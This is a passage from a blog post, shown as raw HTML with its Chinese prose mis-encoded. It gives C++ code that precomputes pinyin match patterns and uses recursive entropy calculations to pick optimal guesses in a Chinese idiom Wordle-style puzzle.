class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 26352</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ZHword</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">string</span> pinyin[<span class="number">12</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitZHWords</span><span class="params">(<span class="built_in">list</span>&lt;ZHword&gt; &amp;words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è¯»å– py ç”Ÿæˆçš„æ‹¼éŸ³</span></span><br><span class="line">    ifstream f_ini(&quot;initials.txt&quot;), f_fin(&quot;finals.txt&quot;), f_ton(&quot;tones.txt&quot;);</span><br><span class="line">    <span class="built_in">string</span> str_ini, str_fin, str_ton; <span class="comment">// å£°æ¯ éŸµæ¯ éŸ³è°ƒ</span></span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    ZHword wordTemp;</span><br><span class="line">    <span class="keyword">while</span> (f_ini &gt;&gt; str_ini &amp;&amp; f_fin &gt;&gt; str_fin &amp;&amp; f_ton &gt;&gt; str_ton)</span><br><span class="line">    &#123;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span>] = str_ini;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>] = str_fin;</span><br><span class="line">        wordTemp.pinyin[cnt % <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>] = str_ton;</span><br><span class="line">        <span class="keyword">if</span> (!(++cnt % <span class="number">4</span>))</span><br><span class="line">            words.push_back(wordTemp);</span><br><span class="line">    &#125;</span><br><span class="line">    f_ini.close();</span><br><span class="line">    f_fin.close();</span><br><span class="line">    f_ton.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CalPattern</span><span class="params">(ZHword guess, ZHword answer, <span class="keyword">char</span> *pattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è®¡ç®— guess ä¸ answer æ¯”å¯¹çš„ pattern, å¹¶å­˜å…¥å‚æ•°ä¸­çš„ pattern</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="built_in">string</span>&gt; miss;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="built_in">string</span>&gt;::iterator iterMiss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (guess.pinyin[i] == <span class="string">&quot;#&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pattern[i % <span class="number">3</span>] |= <span class="number">3</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// unknown =&gt; 11</span></span><br><span class="line">            miss.push_back(answer.pinyin[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (guess.pinyin[i] != answer.pinyin[i])</span><br><span class="line">            miss.push_back(answer.pinyin[i]);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pattern[i % <span class="number">3</span>] |= <span class="number">2</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// certain =&gt; 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (miss.empty())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> marked = <span class="keyword">int</span>(pattern[i % <span class="number">3</span>] &gt;&gt; ((<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>) &amp; <span class="keyword">char</span>(<span class="number">0x3</span>));</span><br><span class="line">        <span class="keyword">if</span> (marked)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (iterMiss = miss.begin(); iterMiss != miss.end(); iterMiss++)</span><br><span class="line">            <span class="keyword">if</span> (guess.pinyin[i] == *iterMiss)</span><br><span class="line">            &#123;</span><br><span class="line">                pattern[i % <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (<span class="number">3</span> - i / <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// uncertain =&gt; 01</span></span><br><span class="line">                miss.erase(iterMiss);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// wrong =&gt; 00</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE]();</span><br><span class="line">        patternsHead[i] = patterns;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt; zh_words;</span><br><span class="line">    <span class="built_in">list</span>&lt;ZHword&gt;::iterator guess, answer;</span><br><span class="line">    InitZHWords(zh_words);</span><br><span class="line">    <span class="keyword">int</span> cntGuess = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (guess = zh_words.begin(); guess != zh_words.end() &amp;&amp; cntGuess &lt; MAXSIZE; guess++, <span class="built_in">cout</span> &lt;&lt; cntGuess++ &lt;&lt; <span class="built_in">endl</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> cntAns = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (answer = zh_words.begin(); answer != zh_words.end(); answer++, cntAns++)</span><br><span class="line">            CalPattern(*guess, *answer, &amp;patternsHead[cntGuess][cntAns * <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">ofstream <span class="title">f</span><span class="params">(<span class="string">&quot;patterns.dat&quot;</span>, ios::out | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> guessIndex = <span class="number">0</span>; guessIndex &lt; MAXSIZE; guessIndex++, <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;SAVE: &quot;</span> &lt;&lt; guessIndex &lt;&lt; <span class="built_in">endl</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> ansIndex = <span class="number">0</span>; ansIndex &lt; MAXSIZE; ansIndex++)</span><br><span class="line">            f.write(&amp;patternsHead[guessIndex][ansIndex * <span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">    f.close();</span><br><span class="line">    zh_words.clear();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>åšå¥½äº†patternsçš„å‡†å¤‡å·¥ä½œï¼Œå°±å¯ä»¥å¼€å§‹æ±‚Eäº†</p><p>å¯¹äº<code>GetEntropy()</code>æ€»å…±å°±ä¸‰æ­¥ï¼š</p><ul><li>æ ¹æ®æœ€å¤§EçŒœè¯</li><li>æ±‚æ–°çš„E</li><li>æ›´æ–°è¯åº“å¹¶å›åˆ°ç¬¬ä¸€æ­¥</li></ul><p>å­˜å‚¨ç»“æ„ä¸Šè¦æä¸€ä¸‹ï¼Œå¦‚æœç›´æ¥åˆ›å»ºè¶…å¤§æ•°ç»„å¤šåŠä¼šsegFaultï¼Œæ‰€ä»¥æˆ‘ç”¨çš„æ‹‰é“¾æ³•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> patterns[MAXSIZE][MAXSIZE * <span class="number">3</span>]; <span class="comment">// =&gt; Segment Fault</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE];</span><br><span class="line">patternsHead[i] = patterns;</span><br><span class="line">&#125; <span class="comment">// =&gt; å½³äº</span></span><br></pre></td></tr></table></figure><p>ä»¥åŠé€’å½’æ·±åº¦æ–¹é¢ï¼Œç”±äºæ·±åº¦åªè¦ä¸ä¸º0å°±ç®—çš„çœŸçš„å¤ªæ…¢äº†ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå’Œ3b1bä¸€æ ·ï¼Œè®¡ç®—æ·±åº¦ä¸º1çš„æ•°æ®æ—¶åªæ‹¿åœ¨æ·±åº¦ä¸º0æ—¶æ’åé å‰çš„æ•°æ®å»è®¡ç®—ï¼Œä»¥å‡å°‘å¯¹è·å–æœ€ä¼˜å¼€å¤´è¯çš„æ— æ•ˆè®¡ç®—</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crack.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 26352</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TOP 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *patternsHead[MAXSIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PatternRecord</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> pattern[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">EntropyRecord</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">float</span> E = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(EntropyRecord A, EntropyRecord B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> A.E &gt; B.E;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitWords</span><span class="params">(<span class="built_in">string</span> *words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">f_word</span><span class="params">(<span class="string">&quot;idioms.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">string</span> str_word;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (f_word &gt;&gt; str_word)</span><br><span class="line">        words[cnt++] = str_word;</span><br><span class="line">    f_word.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SamePattern</span><span class="params">(<span class="keyword">char</span> *guessPattern, <span class="keyword">char</span> *answerPattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guessPattern[<span class="number">0</span>] == answerPattern[<span class="number">0</span>] &amp;&amp;</span><br><span class="line">        guessPattern[<span class="number">1</span>] == answerPattern[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">        guessPattern[<span class="number">2</span>] == answerPattern[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRecords</span><span class="params">(<span class="keyword">char</span> *patterns, <span class="built_in">list</span>&lt;PatternRecord&gt; &amp;records, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å°†è¯æŒ‰ç…§å…¶ pattern åˆ†ç±»</span></span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterGuessRec;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator iterEn = enabled.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!enabled.empty() &amp;&amp; i != *iterEn)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        PatternRecord ansRecord;</span><br><span class="line">        <span class="built_in">memcpy</span>(ansRecord.pattern, &amp;patterns[i * <span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">bool</span> match = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (iterGuessRec = records.begin(); iterGuessRec != records.end(); iterGuessRec++)</span><br><span class="line">            <span class="keyword">if</span> (SamePattern((*iterGuessRec).pattern, ansRecord.pattern))</span><br><span class="line">            &#123;</span><br><span class="line">                (*iterGuessRec).count++;</span><br><span class="line">                match = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!match)</span><br><span class="line">            records.push_back(ansRecord);</span><br><span class="line">        iterEn++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">UpdateEnabled</span><span class="params">(<span class="keyword">char</span> *patterns, <span class="keyword">char</span> *pattern, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lastEnabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ›´æ–°è¯åº“</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; enabled;</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator lastPtr;</span><br><span class="line">    <span class="keyword">for</span> (lastPtr = lastEnabled.begin(); lastPtr != lastEnabled.end(); lastPtr++)</span><br><span class="line">        <span class="keyword">if</span> (SamePattern(&amp;patterns[(*lastPtr) * <span class="number">3</span>], pattern))</span><br><span class="line">            enabled.push_back(*lastPtr);</span><br><span class="line">    <span class="keyword">return</span> enabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function">EntropyRecord <span class="title">GetEntropy</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span> guessIndex, <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; &amp;enabled)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt; patternRecords; <span class="comment">// è®°å½• pattern æ•°é‡ä»¥åŠæ ·å¼</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt; patternERecs;           <span class="comment">// è®°å½•ä¸Šè¿°æ¯ç§ pattern å¯¹åº”çš„ E</span></span><br><span class="line">    GetRecords(patternsHead[guessIndex], patternRecords, enabled);</span><br><span class="line">    <span class="keyword">if</span> (depth)</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterPRec = patternRecords.begin();</span><br><span class="line">             iterPRec != patternRecords.end();</span><br><span class="line">             iterPRec++) <span class="comment">// éå†è¡¨å±‚patterns</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// æ ¹æ®è¡¨å±‚patternè·å–newEnabled</span></span><br><span class="line">            <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; newEnabled;</span><br><span class="line">            <span class="keyword">if</span> (enabled.empty())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">                    <span class="keyword">if</span> (SamePattern(&amp;patternsHead[guessIndex][i * <span class="number">3</span>], (*iterPRec).pattern))</span><br><span class="line">                        newEnabled.push_back(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator iterEn = enabled.begin();</span><br><span class="line">                     iterEn != enabled.end();</span><br><span class="line">                     iterEn++)</span><br><span class="line">                    <span class="keyword">if</span> (SamePattern(&amp;patternsHead[guessIndex][(*iterEn) * <span class="number">3</span>], (*iterPRec).pattern))</span><br><span class="line">                        newEnabled.push_back(*iterEn);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt; localERecords; <span class="comment">// è®°å½•é‡Œå±‚ E</span></span><br><span class="line">            <span class="keyword">if</span> (newEnabled.size() &lt; <span class="number">2</span>)</span><br><span class="line">                localERecords.push_back(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator newGuessIndex = newEnabled.begin();</span><br><span class="line">                     newGuessIndex != newEnabled.end();</span><br><span class="line">                     newGuessIndex++) <span class="comment">// éå†é‡Œå±‚è¯åº“</span></span><br><span class="line">                    <span class="comment">// é€’å½’å…¥å£</span></span><br><span class="line">                    localERecords.push_back(GetEntropy(depth - <span class="number">1</span>, *newGuessIndex, newEnabled).E);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">float</span> localMax = <span class="number">0</span>; <span class="comment">// é‡Œå±‚ E æœ€å¤§å€¼</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt;::iterator iterERec = localERecords.begin();</span><br><span class="line">                 iterERec != localERecords.end();</span><br><span class="line">                 iterERec++)</span><br><span class="line">                <span class="keyword">if</span> (localMax &lt; *iterERec)</span><br><span class="line">                    localMax = *iterERec;</span><br><span class="line">            patternERecs.push_back(localMax);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    EntropyRecord entropyRecord;</span><br><span class="line">    entropyRecord.index = guessIndex;</span><br><span class="line">    <span class="built_in">list</span>&lt;PatternRecord&gt;::iterator iterP = patternRecords.begin();</span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">float</span>&gt;::iterator iterE = patternERecs.begin();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; iterP != patternRecords.end(); iterE++, iterP++) <span class="comment">// E(p)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">float</span> prob = <span class="keyword">float</span>((*iterP).count) / <span class="keyword">float</span>(enabled.empty() ? MAXSIZE : enabled.size());</span><br><span class="line">        entropyRecord.E += -prob * log2(prob);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (depth)</span><br><span class="line">    &#123;</span><br><span class="line">        iterP = patternRecords.begin();</span><br><span class="line">        iterE = patternERecs.begin();</span><br><span class="line">        <span class="keyword">for</span> (; iterE != patternERecs.end(); iterE++, iterP++) <span class="comment">// E(E&#x27;,p) å…¶ä¸­ E&#x27; ä¸ºä¸Šä¸€å±‚çš„ E</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">float</span> prob = <span class="keyword">float</span>((*iterP).count) / <span class="keyword">float</span>(enabled.empty() ? MAXSIZE : enabled.size());</span><br><span class="line">            entropyRecord.E += prob * (*iterE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> entropyRecord;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  &#123; è¡¨å±‚è¯åº“ &#125;  -&gt;  &#123; è¡¨å±‚patterns &#125;  -&gt;  &#123; é‡Œå±‚è¯åº“ &#125;  -&gt;  &#123; é‡Œå±‚patterns &#125;</span></span><br><span class="line"><span class="comment">//                       E1 = âˆ‘p*E0                            E0 = âˆ‘-p*log2(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Init</span></span><br><span class="line">    <span class="built_in">string</span> words[MAXSIZE];</span><br><span class="line">    InitWords(words);</span><br><span class="line">    <span class="function">ifstream <span class="title">f_in</span><span class="params">(<span class="string">&quot;patterns.dat&quot;</span>, ios::in | ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAXSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *patterns = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">3</span> * MAXSIZE];</span><br><span class="line">        patternsHead[i] = patterns;</span><br><span class="line">        f_in.read(patterns, MAXSIZE * <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    f_in.close();</span><br><span class="line"></span><br><span class="line">    <span 